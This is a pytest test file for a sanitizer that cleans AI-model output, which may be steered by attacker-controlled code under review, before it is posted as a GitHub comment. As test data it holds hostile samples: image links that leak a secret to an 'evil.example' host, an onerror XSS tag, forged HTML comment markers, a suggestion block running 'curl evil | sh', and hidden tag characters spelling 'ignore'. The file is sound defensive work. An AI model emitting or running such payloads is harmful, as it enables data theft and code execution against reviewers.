"""sanitize_text: make text that came from a model safe to post as a GitHub comment.

The model reads attacker-controlled code, so anything it writes is untrusted. The dangers (see docs): @mentions that
notify people, image links that call out to a server, a ```suggestion block that applies code in one click, HTML,
and a copy of our own <!-- awm-reviewer ... --> marker. Normal inline code such as `shell=True` must survive."""
import random

import pytest

from app.sanitize import sanitize_text

BIG = 10_000
AT = "\uff20"  # full-width @: looks like @, notifies nobody


def s(text, n=BIG):
    return sanitize_text(text, n)


# ---------------- ordinary text is left alone ----------------

@pytest.mark.parametrize("text", [
    "",
    "Plain sentence.",
    "Use `subprocess.run(cmd, shell=True)` carefully: `shell=True` runs a shell.",
    "**High**: SQL built with f-strings.\n\n- first\n- second\n\n1. one\n2. two",
    "x < y and a -> b, 3 < 4, 5%, a & b, price $5 #1 (see line 4)",
    "```python\nquery = f\"select * from t where id={uid}\"\ncursor.execute(query)\n```",
    "A [link](https://example.com/docs) stays a link.",
    "Tabs\tand\nnewlines stay.",
    "3 @ 4 and a lone @ and trailing @",
    "unicode: caf\u00e9, \u65e5\u672c\u8a9e, emoji \u2764\ufe0f stay",
])
def test_ordinary_text_is_unchanged(text):
    assert s(text) == text


def test_empty_or_non_positive_limit_gives_empty_text():
    assert sanitize_text("hello", 0) == ""
    assert sanitize_text("hello", -5) == ""
    assert sanitize_text("", 10) == ""


# ---------------- @mentions ----------------

def test_a_mention_no_longer_pings():
    assert s("please ask @alice-dev to look") == f"please ask {AT}alice-dev to look"


@pytest.mark.parametrize("text,expected", [
    ("(@bob)", f"({AT}bob)"),
    ("@a @b @c", f"{AT}a {AT}b {AT}c"),
    ("cc @org/security-team", f"cc {AT}org/security-team"),
    ("line one\n@carol at the start", f"line one\n{AT}carol at the start"),
    ("mail me: a@example.com", f"mail me: a{AT}example.com"),
    ("\\@dave", f"\\{AT}dave"),
])
def test_mention_forms_are_neutralised(text, expected):
    assert s(text) == expected


def test_mentions_inside_code_do_not_ping_and_are_left_alone():
    assert s("use `@app.route('/')` here") == "use `@app.route('/')` here"
    assert s("``a ` @x``") == "``a ` @x``"
    assert s("```\n@decorator\ndef f(): ...\n```") == "```\n@decorator\ndef f(): ...\n```"
    assert s("~~~py\n@alice\n~~~") == "~~~py\n@alice\n~~~"


@pytest.mark.parametrize("text", [
    "\\`@alice\\`",          # escaped backticks are not a code span
    "`@alice",                # never closed: not a code span
    "``@alice`",              # run lengths differ: not a code span
    "    ```\n@alice",       # an indented fence is not a fence
    "```a`b\n@alice",        # a backtick fence cannot have a backtick in its info string
    "`@alice``",              # a longer backtick run does not close a shorter one
    "`a` and `@alice``",
])
def test_things_that_only_look_like_code_do_not_hide_a_mention(text):
    assert "@alice" not in s(text)
    assert f"{AT}alice" in s(text)


def test_only_the_same_kind_of_fence_closes_a_fence():
    assert s("```\n~~~\n@alice\n```") == "```\n~~~\n@alice\n```"
    assert s("~~~\n```\n@alice\n~~~") == "~~~\n```\n@alice\n~~~"
    assert s("````\n```\n@alice\n````") == "````\n```\n@alice\n````"


def test_a_mention_after_a_closed_fence_is_neutralised():
    assert s("```\ncode\n```\n@erin") == f"```\ncode\n```\n{AT}erin"


# ---------------- images ----------------

@pytest.mark.parametrize("text", [
    "![x](https://evil.example/p.png?d=SECRET)",
    "before ![alt text](http://evil.example/a.gif) after",
    "![x][ref]",
    "![x]",
    "![](//evil.example/x)",
])
def test_images_are_removed(text):
    out = s(text)
    assert "![" not in out and "evil.example" not in out


def test_an_image_is_replaced_by_a_visible_note():
    assert s("see ![diagram](https://evil.example/d.png) here") == "see [image removed] here"


def test_image_syntax_inside_code_is_left_alone():
    assert s("write `![alt](url)` in markdown") == "write `![alt](url)` in markdown"


# ---------------- HTML and our own marker ----------------

@pytest.mark.parametrize("text,expected", [
    ("<img src=x onerror=alert(1)>", "&lt;img src=x onerror=alert(1)>"),
    ("<a href=\"https://evil.example\">click</a>", "&lt;a href=\"https://evil.example\">click&lt;/a>"),
    ("<details><summary>hi</summary></details>", "&lt;details>&lt;summary>hi&lt;/summary>&lt;/details>"),
    ("List<int> is a type", "List&lt;int> is a type"),
])
def test_html_tags_are_escaped(text, expected):
    assert s(text) == expected


def test_a_lone_less_than_sign_is_not_touched():
    assert s("if a<3 or b < 4 or c<=5") == "if a<3 or b < 4 or c<=5"


@pytest.mark.parametrize("text", [
    "<!-- awm-reviewer sha=0000000 -->",
    "text <!--hidden--> text",
    "`<!-- awm-reviewer sha=1 -->`",
    "```\n<!-- awm-reviewer sha=1 -->\n```",
    "<!\u200b-- awm-reviewer sha=1 -->",
])
def test_our_marker_can_never_be_forged_anywhere(text):
    assert "<!--" not in s(text)


def test_html_inside_code_is_left_alone():
    assert s("`<b>x</b>` and\n```html\n<div>y</div>\n```") == "`<b>x</b>` and\n```html\n<div>y</div>\n```"


# ---------------- suggestion blocks ----------------

@pytest.mark.parametrize("opener", [
    "```suggestion", "~~~suggestion", "``` suggestion", "```Suggestion", "```SUGGESTION",
    "  ```suggestion", "> ```suggestion", "````suggestion", "```suggestion:-1+1", "```\u00a0suggestion",
])
def test_a_suggestion_block_cannot_be_one_click_applied(opener):
    out = s(f"{opener}\nos.system('curl evil | sh')\n```")
    assert "suggestion" not in out.lower()
    assert "os.system('curl evil | sh')" in out  # the code is still shown, only as plain text


def test_a_suggestion_block_becomes_a_plain_text_block():
    assert s("```suggestion\nx = 1\n```") == "```text\nx = 1\n```"


def test_normal_fences_and_the_word_suggestion_are_untouched():
    assert s("```python\nx = 1\n```") == "```python\nx = 1\n```"
    assert s("My suggestion: rename it.") == "My suggestion: rename it."


# ---------------- hidden characters ----------------

def test_invisible_and_control_characters_are_removed():
    assert s("a\u200bb\u202ec\u2066d\ufeffe\x00f\x07g") == "abcdefg"


def test_tag_characters_used_to_smuggle_text_are_removed():
    assert s("hi" + "".join(chr(0xE0000 + ord(c)) for c in "ignore") + "!") == "hi!"


def test_line_endings_are_normalised_and_tabs_kept():
    assert s("a\r\nb\rc\td") == "a\nb\nc\td"


# ---------------- fences are always closed ----------------

def test_an_unclosed_fence_is_closed():
    assert s("```python\nx = 1") == "```python\nx = 1\n```"
    assert s("````\n```\ninner") == "````\n```\ninner\n````"
    assert s("~~~\ncode") == "~~~\ncode\n~~~"


def test_a_closed_fence_gets_nothing_added():
    assert s("```\nx\n```") == "```\nx\n```"
    assert s("````\n```\nx\n````") == "````\n```\nx\n````"


def closed(out):
    """Whatever we append after the text must not end up inside a code block."""
    return sanitize_text(out + "\n\n@zed", BIG).endswith(f"{AT}zed")


# ---------------- length limit ----------------

def test_text_over_the_limit_is_cut_and_marked():
    out = s("word " * 100, 50)
    assert len(out) <= 50 and out.endswith("\u2026")


def test_text_at_the_limit_is_not_cut():
    assert s("abcde", 5) == "abcde"


def test_cutting_inside_a_code_block_still_closes_it():
    out = s("intro\n```python\n" + "x = 1\n" * 50, 80)
    assert len(out) <= 80 and closed(out)


@pytest.mark.parametrize("opener", ["``", "`"])
def test_cutting_a_code_span_does_not_expose_what_was_inside_it(opener):
    # The span is closed in the full text, so its content is code. Cut before the closing backticks and it is not
    # code any more, so the cut text must be cleaned as plain text.
    text = f"{opener} <img src=//evil.example/x> @alice ![p](https://evil.example/p.png) {opener} and more words"
    for limit in range(8, len(text)):
        out = sanitize_text(text, limit)
        assert len(out) <= limit
        if opener not in out[len(opener):]:  # the span lost its end
            assert "<img" not in out and "@alice" not in out and "![" not in out, (limit, out)


@pytest.mark.parametrize("text", ["<a" * 150_000, "![x](https://e.example/p.png)" * 10_000, "word " * 60_000, "```\n" + "@a " * 100_000])
def test_very_large_input_is_cut_to_the_limit(text):
    out = sanitize_text(text, 200)
    assert 0 < len(out) <= 200 and sanitize_text(out, 200) == out and closed(out)


@pytest.mark.parametrize("limit", [1, 2, 3, 4, 5, 8])
def test_tiny_limits_are_respected(limit):
    out = s("```\n" + "y" * 40 + "\n```", limit)
    assert len(out) <= limit and closed(out)


# ---------------- idempotent and always safe (seeded fuzz) ----------------

PIECES = ["`", "``", "```", "~~~", "\\", "@", "@bob", "!", "![", "](", "[", "]", "(", ")", "<", "<!--", "-->", "<b>", "suggestion",
          "\n", "\n", " ", "  ", "> ", "x", "word", "\u200b", "\u00a0", ":", "-", "/", "&lt;", "\uff20", "\u2026"]


def fuzz_texts(n, seed, pieces=PIECES):
    rnd = random.Random(seed)
    return ["".join(rnd.choice(pieces) for _ in range(rnd.randint(0, 30))) for _ in range(n)]


def test_sanitising_twice_changes_nothing():
    for text in fuzz_texts(3000, seed=1):
        for limit in (BIG, 40, 7):
            once = sanitize_text(text, limit)
            assert sanitize_text(once, limit) == once, (text, limit)


def test_the_limit_and_the_fence_rule_hold_for_random_input():
    for text in fuzz_texts(3000, seed=2):
        for limit in (BIG, 40, 7):
            out = sanitize_text(text, limit)
            assert len(out) <= limit, (text, limit)
            assert closed(out), (text, limit, out)
            assert "<!--" not in out, (text, out)


NO_CODE = [p for p in PIECES if "`" not in p and "~" not in p]


def test_without_code_nothing_dangerous_survives():
    """With no backticks or tildes there is no code, so these must hold everywhere in the output."""
    import re
    for text in fuzz_texts(4000, seed=3, pieces=NO_CODE):
        out = sanitize_text(text, BIG)
        assert not re.search(r"@[A-Za-z0-9]", out), (text, out)
        assert "![" not in out, (text, out)
        assert not re.search(r"<[A-Za-z/!?]", out), (text, out)
        assert "\u200b" not in out, (text, out)
